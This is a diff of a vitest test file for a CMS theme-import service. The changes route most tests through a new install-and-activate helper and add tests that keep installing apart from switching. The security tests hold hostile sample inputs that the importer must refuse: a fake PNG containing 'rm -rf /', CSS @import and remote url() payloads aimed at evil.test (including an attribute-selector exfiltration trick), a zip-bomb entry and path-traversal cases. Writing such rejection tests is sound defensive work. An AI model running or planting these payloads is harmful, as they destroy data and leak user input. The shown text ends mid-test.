@@ -111,7 +111,12 @@ vi.mock("../appearance/appearance.service.js", () => ({
     saveThemeCustomCss: async (c: string) => {
       appearance.savedThemeCustomCss = c;
     },
-    setInstalledTheme:  async (m: Record<string, unknown>) => { appearance.savedInstalled = m; },
+    // Also what the site now WEARS — an import compares against that to tell an
+    // update of the active theme from a new install.
+    setInstalledTheme:  async (m: Record<string, unknown>) => {
+      appearance.savedInstalled = m;
+      appearance.installed = m;
+    },
     bumpStyleVersion:   async () => { appearance.styleVersionBumps = (appearance.styleVersionBumps ?? 0) + 1; },
     snapshotThemeLayers: async () => ({ probe: "before" }),
     restoreThemeLayers:  async (snap: unknown) => { rollbackProbe.layers = snap; },
@@ -157,6 +162,25 @@ vi.mock("../../infrastructure/db.js", () => ({
 }));
 
 const { themeService } = await import("./theme.service.js");
+
+/**
+ * Install a package AND put it on the site — what one import did before installing
+ * and switching became two decisions. Most tests here are about what APPLYING a theme
+ * does, so they go through this; the ones about installing without switching call
+ * `importTheme` directly.
+ */
+async function putOn(buf: Buffer, userId: string) {
+  const report = await themeService.importTheme(buf, userId);
+  if (report.activated) return report;
+  const r = await themeService.activateTheme(report.manifest.id, userId);
+  const payload = library.rows.get(report.manifest.id)!.payload;
+  return {
+    ...report,
+    activated: true,
+    templates: r.applied, kept: r.kept, replaced: r.replaced,
+    tokensApplied: !!payload.tokens, customCssApplied: !!payload.customCss,
+  };
+}
 
 // ── Fixtures ─────────────────────────────────────────────────────────────────
 
@@ -370,7 +394,7 @@ describe("import", () => {
     published.templates.home = homeWithHero("pages/hero.png");
     const exported = await themeService.exportTheme(META);
 
-    const report = await themeService.importTheme(exported, "user-1");
+    const report = await putOn(exported, "user-1");
     expect(report.assetsImported).toBe(1);
 
     const stored = path.join(UPLOAD_DIR, "themes", META.id, "hero.png");
@@ -390,7 +414,7 @@ describe("import", () => {
   describe("preview image", () => {
     it("repoints the stored manifest at where the image actually landed", async () => {
       const exported = await themeService.exportTheme(META, { screenshot: PNG });
-      await themeService.importTheme(exported, "user-1");
+      await putOn(exported, "user-1");
 
       expect(appearance.savedInstalled!.screenshot).toBe(`themes/${META.id}/screenshot.png`);
       expect(await fs.readFile(path.join(UPLOAD_DIR, "themes", META.id, "screenshot.png"))).toEqual(PNG);
@@ -403,7 +427,7 @@ describe("import", () => {
         { [THEME_PATHS.css]: ":root { --c-bg: #fff; }" },
         { screenshot: "https://cdn.example.com/shot.png" },
       );
-      await themeService.importTheme(buf, "user-1");
+      await putOn(buf, "user-1");
       expect(appearance.savedInstalled!.screenshot).toBe("https://cdn.example.com/shot.png");
     });
   });
@@ -413,12 +437,12 @@ describe("import", () => {
       [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-bg": "#json" } }),
       [THEME_PATHS.css]: ":root { --c-bg: #css; }",
     });
-    await themeService.importTheme(buf, "user-1");
+    await putOn(buf, "user-1");
     expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#json" } });
   });
 
   it("falls back to the stylesheet when there is no tokens.json", async () => {
-    await themeService.importTheme(pack({ [THEME_PATHS.css]: ":root { --c-bg: #css; }" }), "user-1");
+    await putOn(pack({ [THEME_PATHS.css]: ":root { --c-bg: #css; }" }), "user-1");
     expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#css" } });
   });
 
@@ -426,7 +450,7 @@ describe("import", () => {
     const buf = pack({
       [THEME_PATHS.tokens]: JSON.stringify({ global: { "--x": "red } body { display:none" } }),
     });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/tokens\.json is invalid/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/tokens\.json is invalid/);
   });
 
   /**
@@ -443,7 +467,7 @@ describe("import", () => {
           dark:  { global: { "--c-bg": "#dark" } },
         }),
       });
-      const report = await themeService.importTheme(buf, "user-1");
+      const report = await putOn(buf, "user-1");
       expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#light" } });
       expect(report.ignoredFiles).toContain(`${THEME_PATHS.tokens} (dark)`);
     });
@@ -452,7 +476,7 @@ describe("import", () => {
       const buf = pack({
         [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#light" } }, dark: {} }),
       });
-      const report = await themeService.importTheme(buf, "user-1");
+      const report = await putOn(buf, "user-1");
       expect(report.ignoredFiles).toEqual([]);
     });
 
@@ -461,7 +485,7 @@ describe("import", () => {
         [THEME_PATHS_LEGACY.cssLight]: ":root { --c-bg: #light; }",
         [THEME_PATHS_LEGACY.cssDark]:  ":root { --c-bg: #dark; }",
       });
-      const report = await themeService.importTheme(buf, "user-1");
+      const report = await putOn(buf, "user-1");
       expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#light" } });
       expect(report.ignoredFiles).toContain(THEME_PATHS_LEGACY.cssDark);
     });
@@ -471,7 +495,7 @@ describe("import", () => {
         [THEME_PATHS_LEGACY.customLight]: ".a { color: red }",
         [THEME_PATHS_LEGACY.customDark]:  ".a { color: navy }",
       });
-      const report = await themeService.importTheme(buf, "user-1");
+      const report = await putOn(buf, "user-1");
       expect(appearance.savedThemeCustomCss).toBe(".a { color: red }");
       expect(report.ignoredFiles).toContain(THEME_PATHS_LEGACY.customDark);
     });
@@ -482,7 +506,7 @@ describe("import", () => {
     // the admin's own keys. That was the bug: it overwrote whatever CSS the admin had
     // written, with no baseline and nothing to recover from. See the theme-custom-CSS
     // block at the bottom of this file for the rest of the behaviour.
-    const report = await themeService.importTheme(
+    const report = await putOn(
       pack({ [THEME_PATHS.custom]: ".x { color: red; }" }), "user-1",
     );
     expect(report.customCssApplied).toBe(true);
@@ -495,13 +519,13 @@ describe("import", () => {
       [THEME_PATHS.custom]: ".x { color: red;",
       [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-bg": "#fff" } }),
     });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/syntax error/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/syntax error/);
     expect(appearance.savedThemeTokens).toBeNull();
   });
 
   it("refuses an asset that is not an image or a font, whatever it is called", async () => {
     const buf = pack({ [`${THEME_PATHS.assets}evil.png`]: "#!/bin/sh\nrm -rf /\n" });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/not an allowed image or font/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/not an allowed image or font/);
   });
 
   it("cannot be made to write outside the uploads directory", async () => {
@@ -514,7 +538,7 @@ describe("import", () => {
       // Assets alone are not a theme, so the package carries a token file too.
       [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#fff" } }, dark: {} }),
     });
-    const report = await themeService.importTheme(buf, "user-1");
+    const report = await putOn(buf, "user-1");
 
     expect(report.assetsImported).toBe(1);
     expect(fsSync.existsSync(path.join(UPLOAD_DIR, "themes", META.id, "hero.png"))).toBe(true);
@@ -525,7 +549,7 @@ describe("import", () => {
   it("refuses a package with more assets than the limit", async () => {
     const files: Record<string, Buffer> = {};
     for (let i = 0; i <= THEME_ASSET_LIMITS.maxFiles; i++) files[`${THEME_PATHS.assets}a${i}.png`] = PNG;
-    await expect(themeService.importTheme(pack(files), "user-1")).rejects.toThrow(/the limit is/);
+    await expect(putOn(pack(files), "user-1")).rejects.toThrow(/the limit is/);
   });
 
   it("refuses two assets that would be stored under one name", async () => {
@@ -533,7 +557,7 @@ describe("import", () => {
       [`${THEME_PATHS.assets}hero.png`]: PNG,
       [`${THEME_PATHS.assets}sub/hero.png`]: PNG,
     });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/would be stored as/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/would be stored as/);
   });
 
   it("writes no asset when a layout in the same package is invalid", async () => {
@@ -542,7 +566,7 @@ describe("import", () => {
       [`${THEME_PATHS.assets}hero.png`]: PNG,
       [`${THEME_PATHS.layouts}home.json`]: JSON.stringify(broken),
     });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/home\.json/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/home\.json/);
     expect(savedDrafts.size).toBe(0);
     expect(fsSync.existsSync(path.join(UPLOAD_DIR, "themes", META.id))).toBe(false);
   });
@@ -550,7 +574,7 @@ describe("import", () => {
   it("refuses an entry whose declared size is implausible, without decompressing it", async () => {
     // A 20 MB run of one byte compresses to a few KB — the classic bomb shape.
     const buf = pack({ [`${THEME_PATHS.layouts}home.json`]: Buffer.alloc(20_000_000, 0x20) });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/implausibly large/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/implausibly large/);
   });
 });
 
@@ -594,7 +618,7 @@ describe("plugin templates in a package", () => {
       key: KEY, label: "Test index", pluginId: PLUGIN,
       regions: ["main"], defaultDocument: { templateKey: KEY, regions: {} },
     });
-    const report = await themeService.importTheme(
+    const report = await putOn(
       pack({ [`${THEME_PATHS.layouts}${KEY}.json`]: JSON.stringify(DOC) }), "user-1",
     );
     expect(report.templates).toContain(KEY);
@@ -603,7 +627,7 @@ describe("plugin templates in a package", () => {
   });
 
   it("SKIPS it when the plugin is not, applies the rest, and reports it", async () => {
-    const report = await themeService.importTheme(pack({
+    const report = await putOn(pack({
       [`${THEME_PATHS.layouts}${KEY}.json`]: JSON.stringify(DOC),
       [`${THEME_PATHS.layouts}home.json`]:   JSON.stringify(DEFAULT_LAYOUTS.home),
     }), "user-1");
@@ -622,7 +646,7 @@ describe("style variants", () => {
     published.templates.home = home;
     appearance.effective = { "variant.accent": { "--surface-bg": "#ff0000" } };
 
-    const report = await themeService.importTheme(await themeService.exportTheme(META), "user-1");
+    const report = await putOn(await themeService.exportTheme(META), "user-1");
 
     expect(report.tokensApplied).toBe(true);
     expect(savedDrafts.get("home|")!.regions.main![0]!.variant).toBe("accent");
@@ -635,7 +659,7 @@ describe("style variants", () => {
     const broken = structuredClone(DEFAULT_LAYOUTS.home) as LayoutDocument;
     (broken.regions.main![0] as { variant?: string }).variant = "neon";
     const buf = pack({ [`${THEME_PATHS.layouts}home.json`]: JSON.stringify(broken) });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/home\.json/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/home\.json/);
     expect(savedDrafts.size).toBe(0);
   });
 });
@@ -660,18 +684,18 @@ describe("theme inheritance", () => {
   };
 
   it("records what it ships as the baseline, for every template", async () => {
-    const report = await themeService.importTheme(pkg(), "user-1");
+    const report = await putOn(pkg(), "user-1");
     expect([...themeLayer.keys()].sort()).toEqual(["home", "members"]);
     expect(report.templates.sort()).toEqual(["home", "members"]);
     expect(report.kept).toEqual([]);
   });
 
   it("KEEPS a template the admin customised, and applies the rest", async () => {
-    await themeService.importTheme(pkg(), "user-1");   // 1.0
+    await putOn(pkg(), "user-1");   // 1.0
     savedDrafts.clear();
     customised.add("home");                            // the admin edited Home
 
-    const report = await themeService.importTheme(pkg({ version: "1.1.0" }), "user-1");
+    const report = await putOn(pkg({ version: "1.1.0" }), "user-1");
 
     expect(report.kept).toEqual(["home"]);
     expect(report.templates).toEqual(["members"]);
@@ -685,7 +709,7 @@ describe("theme inheritance", () => {
 
   it("names the version it replaced, so an update can be described", async () => {
     appearance.installed = { id: META.id, name: META.name, version: "1.0.0" };
-    const report = await themeService.importTheme(pkg({ version: "2.0.0" }), "user-1");
+    const report = await putOn(pkg({ version: "2.0.0" }), "user-1");
     expect(report.replaced).toEqual({ id: META.id, name: META.name, version: "1.0.0" });
     expect(appearance.savedInstalled).toMatchObject({ version: "2.0.0" });
   });
@@ -693,14 +717,14 @@ describe("theme inheritance", () => {
   it("puts tokens in the THEME layer, never the admin's draft", async () => {
     // This is token-level inheritance: the admin's own overrides live in a different
     // layer, so they survive an update per TOKEN rather than per file.
-    await themeService.importTheme(pkg(), "user-1");
+    await putOn(pkg(), "user-1");
     expect(appearance.savedThemeTokens).toMatchObject({
       global: { "--c-accent": "#111111" },
     });
   });
 
   it("still reports nothing kept on a first import of a stock site", async () => {
-    const report = await themeService.importTheme(pkg(), "user-1");
+    const report = await putOn(pkg(), "user-1");
     expect(report.kept).toEqual([]);
     expect(report.replaced).toBeNull();
   });
@@ -727,7 +751,7 @@ describe("importing a legacy .xtstyle", () => {
   }
 
   it("accepts one and takes its tokens", async () => {
-    const report = await themeService.importTheme(stylePack(), "user-1");
+    const report = await putOn(stylePack(), "user-1");
     expect(report.manifest.name).toBe("Ocean");
     // The fields it never had are filled in rather than demanded of it.
     expect(report.manifest.id).toBe("ocean");
@@ -738,7 +762,7 @@ describe("importing a legacy .xtstyle", () => {
   });
 
   it("keeps an explicit id or vendor instead of inventing one", async () => {
-    const report = await themeService.importTheme(
+    const report = await putOn(
       stylePack({ name: "Ocean", vendor: "Acme", version: "2.3.0" }), "user-1",
     );
     expect(report.manifest.vendor).toBe("Acme");
@@ -752,14 +776,14 @@ describe("importing a legacy .xtstyle", () => {
     zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Broken" })));
     zip.addFile(THEME_PATHS.css, Buffer.from(":root {}"));
     zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify(DEFAULT_LAYOUTS.home)));
-    await expect(themeService.importTheme(zip.toBuffer(), "user-1")).rejects.toThrow(/manifest/i);
+    await expect(putOn(zip.toBuffer(), "user-1")).rejects.toThrow(/manifest/i);
   });
 
   it("holds the `:root`-only rule the old importer enforced", async () => {
     const zip = new AdmZip();
     zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Sneaky" })));
     zip.addFile(THEME_PATHS.css, Buffer.from("body { display: none; }"));
-    await expect(themeService.importTheme(zip.toBuffer(), "user-1")).rejects.toThrow(/root/i);
+    await expect(putOn(zip.toBuffer(), "user-1")).rejects.toThrow(/root/i);
   });
 });
 
@@ -783,7 +807,7 @@ describe("tokens-only export", () => {
 
   it("round-trips: what it exports, it can import", async () => {
     const buf = await themeService.exportTheme(META, { tokensOnly: true });
-    const report = await themeService.importTheme(buf, "user-1");
+    const report = await putOn(buf, "user-1");
     expect(report.templates).toEqual([]);
   });
 });
@@ -819,7 +843,7 @@ describe("rejections are actionable", () => {
     // `XEC-API-4001` has a localized string ("Please check your input and try again"),
     // and the web client prefers a localized string over the server's message — so
     // borrowing that code silently replaced every specific reason with a generic one.
-    await expect(themeService.importTheme(brokenTheme(), "user-1"))
+    await expect(putOn(brokenTheme(), "user-1"))
       .rejects.toMatchObject({ code: "XEC-CORE-8002", httpStatus: 422 });
   });
 
@@ -827,7 +851,7 @@ describe("rejections are actionable", () => {
     // Zod's message for a missing required field is "expected string, received
     // undefined" — repeated once per absent field, which identifies nothing. The
     // PATH is the only part that says what to go and fix.
-    const err = await rejectionOf(themeService.importTheme(brokenTheme(), "user-1"));
+    const err = await rejectionOf(putOn(brokenTheme(), "user-1"));
     expect(err.message).toContain("id:");
     expect(err.message).toContain("vendor:");
     expect(err.message).toContain("version:");
@@ -838,7 +862,7 @@ describe("rejections are actionable", () => {
     const zip = new AdmZip();
     zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ ...META, minXentiumVersion: "1.0" })));
     zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify({ templateKey: "home" , regions: { main: [{ id: "x" }] } })));
-    const err = await rejectionOf(themeService.importTheme(zip.toBuffer(), "user-1"));
+    const err = await rejectionOf(putOn(zip.toBuffer(), "user-1"));
     expect(err.message).toContain("layouts/home.json");
     expect(err.message).toMatch(/main\.0/);   // the offending node, by path
   });
@@ -859,7 +883,7 @@ describe("theme custom CSS", () => {
   it("stages into the THEME layer and never touches the admin's stylesheet", async () => {
     appearance.customCss = ".mine { color: blue }";
 
-    const report = await themeService.importTheme(withCss(), "user-1");
+    const report = await putOn(withCss(), "user-1");
 
     expect(report.customCssApplied).toBe(true);
     expect(appearance.savedThemeCustomCss).toContain(".x");
@@ -875,14 +899,14 @@ describe("theme custom CSS", () => {
       [THEME_PATHS.custom]: `.hero { background: url("assets/tile.png") }`,
       [`${THEME_PATHS.assets}tile.png`]: PNG,
     });
-    await themeService.importTheme(buf, "user-1");
+    await putOn(buf, "user-1");
     expect(appearance.savedThemeCustomCss)
       .toContain(`url("/uploads/themes/${META.id}/tile.png")`);
   });
 
   it("REFUSES @import — it fetches a stylesheet from another server", async () => {
     const buf = withCss({ [THEME_PATHS.custom]: `@import url("https://evil.test/x.css"); .a{color:red}` });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/@import/);
+    await expect(putOn(buf, "user-1")).rejects.toThrow(/@import/);
   });
 
   it("REFUSES a remote url() — the exfiltration and fingerprinting vector", async () => {
@@ -891,13 +915,13 @@ describe("theme custom CSS", () => {
       `.a { background: url("//evil.test/p.png") }`,
       `input[value^="a"] { background: url('http://evil.test/a') }`,
     ]) {
-      await expect(themeService.importTheme(withCss({ [THEME_PATHS.custom]: bad }), "user-1"))
+      await expect(putOn(withCss({ [THEME_PATHS.custom]: bad }), "user-1"))
         .rejects.toThrow(/another server/);
     }
   });
 
   it("REFUSES a reference the package does not carry, naming it", async () => {
-    const err = await rejectionOf(themeService.importTheme(
+    const err = await rejectionOf(putOn(
       withCss({ [THEME_PATHS.custom]: `.a { background: url(assets/absent.png) }` }), "user-1",
     ));
     expect(err.message).toContain("assets/absent.png");
@@ -907,7 +931,7 @@ describe("theme custom CSS", () => {
   it("allows data: URLs and site-absolute paths — neither can reach off-site", async () => {
     const css = `.a{background:url("data:image/gif;base64,R0lGODlhAQABAAAAACw=")}`
       + `.b{background:url(/uploads/branding/logo.png)}`;
-    await themeService.importTheme(withCss({ [THEME_PATHS.custom]: css }), "user-1");
+    await putOn(withCss({ [THEME_PATHS.custom]: css }), "user-1");
     expect(appearance.savedThemeCustomCss).toContain("data:image/gif");
     expect(appearance.savedThemeCustomCss).toContain("/uploads/branding/logo.png");
   });
@@ -918,7 +942,7 @@ describe("theme custom CSS", () => {
       [THEME_PATHS.custom]: `.a { background: url(https://evil.test/p.png) }`,
       [`${THEME_PATHS.assets}tile.png`]: PNG,
     });
-    await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow();
+    await expect(putOn(buf, "user-1")).rejects.toThrow();
     await expect(fs.readdir(path.join(UPLOAD_DIR, "themes", META.id))).rejects.toThrow();
     expect(appearance.savedThemeCustomCss).toBeNull();
   });
@@ -939,7 +963,7 @@ describe("theme custom CSS", () => {
     expect(css).toContain(".mine { color: blue }");
 
     // And what it produced is accepted back.
-    await expect(themeService.importTheme(zip.toBuffer(), "user-1")).resolves.toBeTruthy();
+    await expect(putOn(zip.toBuffer(), "user-1")).resolves.toBeTruthy();
   });
 });
 
@@ -967,19 +991,19 @@ describe("undoing an import", () => {
     // ⚠ The ordering is the whole feature. Snapshotting after the first write would
     // capture the theme being installed as if it were what was there before, and
     // "undo" would restore the thing it was meant to remove.
-    await themeService.importTheme(themePackage(), "u1");
+    await putOn(themePackage(), "u1");
     expect(rollbackProbe.saved).toBeTruthy();
     expect(rollbackProbe.snapshotAt).toBe(0);
   });
 
   it("records the theme it replaced, so the undo can name it", async () => {
     appearance.installed = { id: "old-theme", name: "Old Theme", version: "1.0.0" };
-    await themeService.importTheme(themePackage(), "u1");
+    await putOn(themePackage(), "u1");
     expect(rollbackProbe.saved.replaced).toBe("Old Theme");
   });
 
   it("restores both halves and then drops the undo point", async () => {
-    await themeService.importTheme(themePackage(), "u1");
+    await putOn(themePackage(), "u1");
     const res = await themeService.discardImportedTheme("u1");
 
     expect(res.restored).toBe(true);
@@ -996,7 +1020,7 @@ describe("undoing an import", () => {
     // The case the empty-site test cannot show: an admin who had already staged a
     // layout must get THAT back, not the theme's version of it and not nothing.
     savedDrafts.set("home|", DEFAULT_LAYOUTS.home as LayoutDocument);
-    await themeService.importTheme(themePackage(), "u1");
+    await putOn(themePackage(), "u1");
     await themeService.discardImportedTheme("u1");
     expect(rollbackProbe.restored).toEqual(["home"]);
   });
@@ -1005,7 +1029,7 @@ describe("undoing an import", () => {
     // Restoring "no staged rows" is the correct undo for a site with none — and it
     // is the case a restore that only wrote rows back would get wrong, leaving every
     // row the import created in place and undoing almost nothing.
-    await themeService.importTheme(themePackage(), "u1");
+    await putOn(themePackage(), "u1");
     await themeService.discardImportedTheme("u1");
     expect(rollbackProbe.restoreCalled).toBe(true);
     expect(rollbackProbe.restored).toEqual([]);
@@ -1019,7 +1043,7 @@ describe("undoing an import", () => {
 
   it("reports whether an undo is available", async () => {
     expect(await themeService.getRollbackState()).toMatchObject({ available: false });
-    await themeService.importTheme(themePackage(), "u1");
+    await putOn(themePackage(), "u1");
     expect(await themeService.getRollbackState()).toMatchObject({ available: true });
   });
 });
@@ -1040,15 +1064,15 @@ describe("the library", () => {
 
   it("keeps a theme when a DIFFERENT one is installed after it", async () => {
     // The complaint this feature answers, stated as a test.
-    await themeService.importTheme(themePackage({ id: "aurora", name: "Aurora" }), "u1");
-    await themeService.importTheme(themePackage({ id: "meadow", name: "Meadow" }), "u1");
+    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
+    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");
 
     expect([...library.rows.keys()].sort()).toEqual(["aurora", "meadow"]);
   });
 
-  it("marks exactly one active — the one just installed", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora", name: "Aurora" }), "u1");
-    await themeService.importTheme(themePackage({ id: "meadow", name: "Meadow" }), "u1");
+  it("marks exactly one active — the one just put on", async () => {
+    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
+    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");
 
     expect(library.rows.get("aurora")!.active).toBe(false);
     expect(library.rows.get("meadow")!.active).toBe(true);
@@ -1057,22 +1081,22 @@ describe("the library", () => {
   it("UPDATES the row when the same id is imported again", async () => {
     // An upgrade, not a second entry: the id is what a licence and an entitlement
     // point at, so two rows for one theme would be two answers to one question.
-    await themeService.importTheme(themePackage({ id: "aurora", version: "1.0.0" }), "u1");
-    await themeService.importTheme(themePackage({ id: "aurora", version: "2.0.0" }), "u1");
+    await putOn(themePackage({ id: "aurora", version: "1.0.0" }), "u1");
+    await putOn(themePackage({ id: "aurora", version: "2.0.0" }), "u1");
 
     expect(library.rows.size).toBe(1);
     expect(library.rows.get("aurora")!.version).toBe("2.0.0");
   });
 
   it("stores the payload, so a switch needs no package", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
+    await putOn(themePackage({ id: "aurora" }), "u1");
     const payload = library.rows.get("aurora")!.payload as { documents: Record<string, unknown> };
     expect(Object.keys(payload.documents)).toContain("home");
   });
 
   it("applies a stored theme on activate, and flips which row is active", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora", name: "Aurora" }), "u1");
-    await themeService.importTheme(themePackage({ id: "meadow", name: "Meadow" }), "u1");
+    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
+    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");
 
     await themeService.activateTheme("aurora", "u1");
 
@@ -1083,8 +1107,8 @@ describe("the library", () => {
   });
 
   it("takes a fresh undo point when switching, so a switch is reversible too", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora", name: "Aurora" }), "u1");
-    await themeService.importTheme(themePackage({ id: "meadow", name: "Meadow" }), "u1");
+    await putOn(themePackage({ id: "aurora", name: "Aurora" }), "u1");
+    await putOn(themePackage({ id: "meadow", name: "Meadow" }), "u1");
     delete rollbackProbe.saved;
 
     await themeService.activateTheme("aurora", "u1");
@@ -1099,14 +1123,14 @@ describe("the library", () => {
     // Deleting it would leave the site wearing a theme with no record of where it
     // came from, no baseline for "Revert to theme", and no way back — the exact
     // state the library exists to prevent.
-    await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
+    await putOn(themePackage({ id: "aurora" }), "u1");
     await expect(themeService.uninstallTheme("aurora")).rejects.toMatchObject({ httpStatus: 409 });
     expect(library.rows.has("aurora")).toBe(true);
   });
 
   it("uninstalls one that is not active", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
-    await themeService.importTheme(themePackage({ id: "meadow" }), "u1");
+    await putOn(themePackage({ id: "aurora" }), "u1");
+    await putOn(themePackage({ id: "meadow" }), "u1");
     await themeService.uninstallTheme("aurora");
     expect([...library.rows.keys()]).toEqual(["meadow"]);
   });
@@ -1127,7 +1151,7 @@ describe("the library", () => {
   });
 
   it("does not backfill over a row that already exists", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora", version: "1.0.0" }), "u1");
+    await putOn(themePackage({ id: "aurora", version: "1.0.0" }), "u1");
     appearance.installed = { id: "aurora", name: "Aurora", version: "1.0.0" };
     await themeService.listThemes();
     expect(library.rows.get("aurora")!.version).toBe("1.0.0");
@@ -1155,21 +1179,21 @@ describe("applying a theme is live", () => {
   });
 
   it("publishes the theme's layouts rather than staging them", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
+    await putOn(themePackage({ id: "aurora" }), "u1");
     expect([...livePublished.keys()]).toContain("home");
   });
 
   it("tells every open client, over the channel that already exists", async () => {
     // The style version is what the appearance SSE carries, and layouts ride the same
     // channel — a theme that went live silently would sit unseen until a reload.
-    await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
+    await putOn(themePackage({ id: "aurora" }), "u1");
     expect(appearance.styleVersionBumps).toBeGreaterThan(0);
   });
 
   it("still writes the theme LAYER, which is what Revert to theme restores", async () => {
     // Live is not a reason to stop recording the baseline: it is what the next update
     // compares against and what an admin reverts one template to.
-    await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
+    await putOn(themePackage({ id: "aurora" }), "u1");
     expect(themeLayer.has("home" as TemplateKey)).toBe(true);
   });
 
@@ -1177,19 +1201,119 @@ describe("applying a theme is live", () => {
     // Going live changes WHERE a theme's document lands, not the inheritance rule:
     // an admin who arranged a page keeps their arrangement.
     customised.add("home" as TemplateKey);
-    const report = await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
+    const report = await putOn(themePackage({ id: "aurora" }), "u1");
     expect(report.kept).toContain("home");
     expect(livePublished.has("home")).toBe(false);
   });
 
+  /**
+   * ⚠ The theme layer is REPLACED on a switch, never merged. Tokens and the stylesheet
+   * used to be written only when the incoming theme carried them, so switching from a
+   * theme with a stylesheet (fonts, rules) to one without kept serving the old one —
+   * found by switching a dev site from Redline back to a colours-only theme.
+   */
+  it("clears the previous theme's stylesheet and tokens when the next one has none", async () => {
+    await putOn(pack({
+      [`${THEME_PATHS.layouts}home.json`]: JSON.stringify(DEFAULT_LAYOUTS.home),
+      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-accent": "#e22b2b" } }),
+      [THEME_PATHS.custom]: ".x { color: red; }",
+    }, { id: "redline" }), "u1");
+    expect(appearance.savedThemeCustomCss).toContain(".x");
+
+    await putOn(themePackage({ id: "plain" }), "u1");
+    expect(appearance.savedThemeCustomCss).toBe("");
+    expect(appearance.savedThemeTokens).toEqual({});
+
+    await themeService.activateTheme("redline", "u1");
+    expect(appearance.savedThemeCustomCss).toContain(".x");
+    await themeService.activateTheme("plain", "u1");
+    expect(appearance.savedThemeCustomCss).toBe("");
+  });
+
   it("goes live on a SWITCH too, not only on import", async () => {
-    await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
-    await themeService.importTheme(themePackage({ id: "meadow" }), "u1");
+    await putOn(themePackage({ id: "aurora" }), "u1");
+    await putOn(themePackage({ id: "meadow" }), "u1");
     livePublished.clear();
     appearance.styleVersionBumps = 0;
 
     await themeService.activateTheme("aurora", "u1");
     expect([...livePublished.keys()]).toContain("home");
     expect(appearance.styleVersionBumps).toBeGreaterThan(0);
+  });
+});
+
+/**
+ * Installing is not switching.
+ *
+ * An import used to put the theme on the site in the same step, so installing one to
+ * look at it changed the whole site. Now it lands in the library and the admin is
+ * asked. The one exception is an UPDATE to the theme already being worn — "keep the
+ * current theme" would then mean keeping the old version of the same theme, while the
+ * library claimed the new one.
+ */
+describe("installing is not switching", () => {
+  beforeEach(() => {
+    for (const k of Object.keys(rollbackProbe)) delete rollbackProbe[k];
+    livePublished.clear();
+    library.rows.clear();
+    appearance.styleVersionBumps = 0;
+  });
+
+  it("adds a new theme to the library WITHOUT touching the site", async () => {
+    appearance.installed = { id: "aurora", name: "Aurora", version: "1.0.0" };
+    const report = await themeService.importTheme(themePackage({ id: "meadow", name: "Meadow" }), "u1");
+
+    expect(report.activated).toBe(false);
+    expect(report.current).toEqual({ id: "aurora", name: "Aurora", version: "1.0.0" });
+    expect(library.rows.get("meadow")!.active).toBe(false);
+    // Nothing a visitor sees moved: no layout published, no layer written, no push.
+    expect(livePublished.size).toBe(0);
+    expect(appearance.savedThemeTokens).toBeNull();
+    expect(appearance.savedInstalled).toBeNull();
+    expect(appearance.styleVersionBumps).toBe(0);
+    expect(rollbackProbe.saved).toBeUndefined();
+  });
+
+  it("leaves the ACTIVE row active", async () => {
+    await putOn(themePackage({ id: "aurora" }), "u1");
+    await themeService.importTheme(themePackage({ id: "meadow" }), "u1");
+
+    expect(library.rows.get("aurora")!.active).toBe(true);
+    expect(library.rows.get("meadow")!.active).toBe(false);
+  });
+
+  it("asks on a stock site too — stock Xentium is a look, and `current` says so with null", async () => {
+    const report = await themeService.importTheme(themePackage({ id: "aurora" }), "u1");
+    expect(report.activated).toBe(false);
+    expect(report.current).toBeNull();
+  });
+
+  it("APPLIES an update to the theme the site is already wearing", async () => {
+    await putOn(themePackage({ id: "aurora", version: "1.0.0" }), "u1");
+    livePublished.clear();
+
+    const report = await themeService.importTheme(themePackage({ id: "aurora", version: "1.1.0" }), "u1");
+    expect(report.activated).toBe(true);
